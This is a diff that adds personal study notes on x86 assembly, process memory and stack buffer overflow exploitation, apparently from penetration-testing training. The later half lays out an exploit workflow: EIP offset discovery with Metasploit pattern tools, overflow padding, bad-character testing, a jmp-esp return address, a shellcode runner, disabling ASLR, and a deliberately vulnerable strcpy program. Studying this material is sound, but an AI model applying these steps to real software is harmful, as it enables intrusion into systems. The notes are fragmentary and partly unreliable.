@@ -1,0 +1,227 @@
+assembly notes review
+ISA - instruction set architecture
+eax - accumulator - math
+ecx - couter - shift/rotate/loops
+edx - math and i/o
+ebx - base pointer to data
+esp - top of stack
+ebp - base of stack
+esi - source in stream operation
+edi - destination in stream operation
+eip - next instruction that will be executed
+
+memory organization of process
+text, data, heap, stack
+text - contains instructions, typicaly read-only
+data - init'd and uninit'd data, static/global vars, can be modified
+uninit'd data - bss block started by symbol - vars init'd to zero or don't have explicit init value
+heap - space to extend data region brk/sbrk sys calls, malloc, realloc, free
+stack - LIFO - array used for saving function's return addr, passing args, storing local vars
+0 heap -> <- stack 0xFFFFFFFF
+esp - top of stack
+push - subtracts 4 (32bit) or 8 (64bit) from ESP and writes data to mem addr in ESP, then updates ESP to top of stack - if we didn't subtract ESP would be overwritten
+ex: esp ends in 80, push 1 is executed, esp ends in 7c now and 1 is pushed onto the stack in mem addr ending in 7c
+pop - same in reverse, pop doesn't remove values, they remain until something overwrites
+1.2.4.3 procedures and functions
+
+2.2 assembler
+assembler creates object file
+linker takes 1+ obj files and makes an executable
+https://sourceforge.net/projects/nasmx/
+nasm -f win32 demo1.asm -o demo1.obj
+#golink in same dir as nasm.exe
+GoLink.exe /entry _main demo1.obj kernel32.dll user32.dll
+
+assembly
+windows - instruction destination source
+mov eax,2
+mv ebx,5
+add eax,ebx ;store value of add in eax
+linux - instruction source destination
+ATT(linux?) adds %before reg and $before num, Q/L/W/B to define operand size (quad/long/word/byte) - 64/32/16/8 sizing
+
+push extends stack 1 bit per cpu register size - 32 or 64
+push is the same as:
+sub esp, 4 ;subtract 4 from esp store value in esp
+mov [esp], 0x12345678 ; stores value in esp, brackets mean store in the addr pointed by the register
+
+pop reads val from stop of stack and adds 32/64 bits
+pop is the same as:
+mov eax,[esp] ;store top of stack mem addr value in eax
+add esp,4 ; add 4 to esp, moving the top of the stack
+
+subroutines:
+CALL - push current EIP to stack, jump to function addr specified, when RET is called the last element is popped, and CPU jumps to the addr specified
+
+mov eax,1
+mov ebx,2
+call add_sub; call subroutine with this name - see below
+inc eax; increment eax by 1
+jmp end_sample
+add_sub:
+add eax,ebx
+retn ;return to caller function
+
+end_sample:
+
+unsure if this is the same program, example of procedure call
+proc proc_1
+	Locals none
+	mov ecx, [ebp+8] ; ebp+8 is the function arg
+	push ecx
+	pop ecx
+endproc
+proc proc_2
+	Locals none
+	invoke proc_1, 5;
+endproc
+;5 is passed into the ebp+8 value above?
+
+2.5.1 compilers
+
+
+
+shellcode tester c program
+
+char code[] = "shell code will go here!"; int main(int argc, char **argv) { int (*func)(); func = (int (*)()) code; (int)(*func)(); }
+
+
+
+asdf
+
+
+
+
+ltrace
+
+
+
+3 major components of process mem
+code segment - instructions that cpu executess
+data segment - vars, buffers
+stack segment - used to pass args to fuctions, space for vars - push/pop add/remove 4 bytes into register
+
+esp points to top of stack / current stack location
+
+push puts esp lower, pop puts esp higher on stack
+
+when a fucntion/subroutine is entered, a stack frame is created to keep the parent params together, and pass args to subrouting
+
+process mem:
+32 bit proc mem addr 0x00000000 to 0x7FFFFFFF - userspace, 0x80000000 to 0xFFFFFFFF kernel space
+windows uses flat mem model, cpu can directly/sequentially access all mem
+kernel space only accessible by OS
+when proc is created, PEB and TEB, are created
+
+peb - process execution block - userland params assoc'd with process
+contains:
+location of main executable
+pointer to loader data - can be used to list dlls/ modules that can/are loaded into proc
+pointer to info about heap
+
+teb - thread exection block
+contains:
+location of PEB in memory
+location of stack for the thread
+pointer to first entry in SEH chain
+
+each thread inside the proc has 1 TEB
+
+stack:
+stack per thread
+size defined on creation, doesn't change
+LIFO
+when a function returns, saved value of eip is retreived and put back into eip so normal app flow resumes
+most functions start with push ebp, mov ebp, esp
+
+0x7FFFFFFF prog starts here and goes backwards to 0
+'sub esp,0x98' used when we allocated space for 128 byte var
+
+redirect eip to 
+
+
+#gen unique string
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
+
+pattern_offset.rb
+
+eip at crash = 6A42336A
+
+root@thp3:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 5000 -q 6A42336A
+[*] Exact match at offset 1060
+
+print ('A' * 25000, 'A' * 1060, 'BBBB','CCCC',sep="")
+
+EIP overwritten with B's
+
+print ('A' * 25000, 'A' * 1060, 'BBBB','CCCC',sep="")
+
+d esp #pointed to 4 chars after our pattern started, added padding to front:
+
+print ('A' * 25000, 'A' * 1060, eip, preshell, esp,sep="")
+
+eip='BBBB'
+preshell='FFFF'
+esp='CCCCCCCC'
+
+can't use the destination of esp, it changes
+finding a function that jumps to a register is another way
+
+test additional padding of 300 chars for reverse shell
+
+bad chars
+for x in `seq 1 255`; do printf '\\x' ;printf '%02x' "$x";done
+
+check hex dump in debugger for missing chars after sending
+
+look for dll without dep enabled, search with mona:
+
+root@thp3:~# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+jnasm > jmp esp
+00000000  FFE4              jmp esp
+
+!mona find -s "\xff\xe4" -m guard32.dll
+
+7375D6EF addr found
+go to address in disassmebler button looks like ->:
+verify addr contains jmp esp
+written in reverse, mem stores in little endian format:
+eip=('\xEF\xD6\x75\x73')
+
+set breakpoint in debugger to verify you've jumped
+
+msfvenom - fucked currently
+
+#check esp
+
+#include <stdio.h>
+void main() {
+        register int i asm("esp");
+        printf("$esp = %#010x\n", i);
+}
+
+#ASLR disable
+echo 0 > /proc/sys/kernel/randomize_va_space
+    ./esp
+    ./esp
+    ./esp
+
+Now esp is always the same
+
+#vuln prog
+#include <string.h>
+#include <stdio.h>
+void main(int argc, char *argv[]) {
+	copier(argv[1]);
+	printf("Done!\n");
+}
+int copier(char *str) {
+	char buffer[100];
+	strcpy(buffer, str);
+}
+
+
+linux buffer overflow crossfire ~/scripts/crossfire1.py
+
+iptables -A INPUT -p TCP --destination-port 13327 \! -d 127.0.0.1 -j DROP
+iptables -A INPUT -p TCP --destination-port 4444 \! -d 127.0.0.1 -j DROP
